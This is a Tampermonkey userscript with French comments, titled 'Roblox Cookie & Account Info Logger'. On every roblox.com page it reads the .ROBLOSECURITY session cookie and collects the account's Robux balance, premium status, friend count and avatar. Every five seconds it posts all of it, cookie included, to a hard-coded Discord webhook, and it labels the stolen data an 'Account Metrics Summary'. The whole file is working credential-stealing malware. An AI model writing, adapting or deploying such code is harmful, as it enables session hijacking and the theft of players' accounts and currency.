// ==UserScript==
// @name         Roblox Cookie & Account Info Logger
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Récupère le cookie et les infos du compte Roblox, puis envoie tout à un webhook Discord.
// @author       Imran OUa
// @match        https://www.roblox.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @connect      api.roblox.com
// @connect      discord.com
// @connect      economy.roblox.com
// @connect      premiumfeatures.roblox.com
// @connect      friends.roblox.com
// @connect      thumbnails.roblox.com
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    // ===== Configuration =====
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1502798917857972286/HpBjJ9iGlBEK9crjQDFepbOvK13vEsEyZznVTSuOhwJPvggARWbq1PntaaLDsaE0ERnW";
    const COOKIE_NAME = ".ROBLOSECURITY";
    const sentCookies = new Set(JSON.parse(localStorage.getItem("robloxSentCookies") || "[]"));

    // ===== Fonctions pour récupérer les infos =====
    async function fetchAuthInfo() {
        try {
            const res = await fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' });
            if (res.ok) return await res.json();
        } catch (err) { console.error(err); }
        return null;
    }

    async function fetchRobuxBalance(userId) {
        try {
            const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { credentials: 'include' });
            if (res.ok) {
                const data = await res.json();
                return data.robux || 0;
            }
        } catch (err) { console.error(err); }
        return "Unknown";
    }

    async function checkPremium(userId) {
        try {
            const res = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { credentials: 'include' });
            return res.ok;
        } catch (err) { console.error(err); }
        return false;
    }

    async function fetchProfileDetails(userId) {
        try {
            const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, { credentials: 'include' });
            if (res.ok) return await res.json();
        } catch (err) { console.error(err); }
        return null;
    }

    async function fetchFriendCount(userId) {
        try {
            const res = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { credentials: 'include' });
            if (res.ok) {
                const data = await res.json();
                return data.count || 0;
            }
        } catch (err) { console.error(err); }
        return "Unknown";
    }

    async function fetchAvatarMetadata(userId) {
        try {
            const res = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
            if (res.ok) {
                const data = await res.json();
                return data.data?.[0]?.imageUrl || "";
            }
        } catch (err) { console.error(err); }
        return "";
    }

    // ===== Envoi au webhook =====
    async function sendToWebhook(cookieValue, robuxBalance, username, displayName, premiumStatus, creationYear, friendCount, avatarUrl) {
        if (!WEBHOOK_URL) return;

        const premiumText = premiumStatus ? "Yes (Premium)" : "No Premium";

        const payload = {
            embeds: [{
                title: "📊 Roblox Account Metrics Summary",
                fields: [
                    { name: "Display Name", value: displayName, inline: true },
                    { name: "Username", value: username, inline: true },
                    { name: "Robux Balance", value: String(robuxBalance), inline: true },
                    { name: "Premium Status", value: premiumText, inline: true },
                    { name: "Account Age (Year)", value: String(creationYear), inline: true },
                    { name: "Total Friends", value: String(friendCount), inline: true }
                ],
                description: "**Session Cookie:**\n```" + cookieValue + "```",
                color: 3447003,
                thumbnail: avatarUrl ? { url: avatarUrl } : null,
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await GM_xmlhttpRequest({
                method: "POST",
                url: WEBHOOK_URL,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify(payload)
            });
            sentCookies.add(cookieValue);
            localStorage.setItem("robloxSentCookies", JSON.stringify(Array.from(sentCookies)));
        } catch (err) {
            console.error("Error sending to webhook:", err);
        }
    }

    // ===== Récupération et envoi des données =====
    async function checkAndSendCookie() {
        const currentCookie = document.cookie.split(';').find(c => c.trim().startsWith(`${COOKIE_NAME}=`))?.split('=')[1];
        if (!currentCookie || sentCookies.has(currentCookie)) return;

        try {
            const authData = await fetchAuthInfo();
            if (!authData?.id) return;

            const userId = authData.id;
            const username = authData.name;
            const displayName = authData.displayName || authData.name;

            const [robuxBalance, isPremium, profileDetails, friendCount, avatarUrl] = await Promise.all([
                fetchRobuxBalance(userId),
                checkPremium(userId),
                fetchProfileDetails(userId),
                fetchFriendCount(userId),
                fetchAvatarMetadata(userId)
            ]);

            const creationYear = profileDetails?.created ? new Date(profileDetails.created).getFullYear() : "Unknown";

            await sendToWebhook(
                currentCookie,
                robuxBalance,
                username,
                displayName,
                isPremium,
                creationYear,
                friendCount,
                avatarUrl
            );
        } catch (error) {
            console.error("Error in checkAndSendCookie:", error);
        }
    }

    // Vérifie le cookie toutes les 5 secondes
    checkAndSendCookie();
    setInterval(checkAndSendCookie, 5000);
})();
